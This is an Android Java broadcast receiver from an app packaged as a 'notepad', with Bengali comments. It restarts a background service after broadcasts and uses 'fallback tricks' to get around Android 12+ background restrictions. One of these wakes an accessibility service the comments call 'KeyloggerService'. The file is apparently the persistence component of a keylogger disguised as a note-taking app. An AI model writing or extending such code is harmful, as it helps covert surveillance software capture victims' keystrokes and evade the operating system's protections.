package com.megh.notepad; // আপনার সঠিক প্যাকেজ নেম

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class RestartReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d("RestartReceiver", "Broadcast Received! Action: " + action);

        Intent serviceIntent = new Intent(context, BackgroundService.class);
        
        try {
            // Android 12 (API 31) এর ওপরের ভার্সনে ব্যাকগ্রাউন্ড থেকে সার্ভিস স্টার্টে কড়াকড়ি আছে।
            // তবে BOOT_COMPLETED বা কিছু স্পেশাল ব্রডকাস্টের ক্ষেত্রে এটি কাজ করে।
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            Log.d("RestartReceiver", "BackgroundService successfully requested to start.");
            
        } catch (Exception e) {
            // যদি Android 12+ এখানে সার্ভিস চালু করতে না দেয় (ForegroundServiceStartNotAllowedException)
            Log.e("RestartReceiver", "Android 12+ Background Restriction: " + e.getMessage());
            
            // 🌟 ফলব্যাক ট্রিক ১: নরমাল স্টার্ট দিয়ে ট্রাই করা (মাঝে মাঝে সিস্টেম অ্যালাউ করে)
            try {
                context.startService(serviceIntent);
            } catch (Exception ex) {
                Log.e("RestartReceiver", "Normal start also failed: " + ex.getMessage());
            }
            
            // 🌟 ফলব্যাক ট্রিক ২: KeyloggerService (Accessibility) কে সিগন্যাল পাঠানো
            // যেহেতু Accessibility Service সবসময় রানিং থাকে, তাই আমরা তাকে সিগন্যাল দিতে পারি
            // যেন সে তার ভেতর থেকে BackgroundService কে স্টার্ট করে দেয়।
            try {
                Intent pingIntent = new Intent("WAKE_UP_ACCESSIBILITY");
                context.sendBroadcast(pingIntent);
            } catch (Exception ex2) {
                Log.e("RestartReceiver", "Failed to ping Accessibility: " + ex2.getMessage());
            }
        }
    }
}


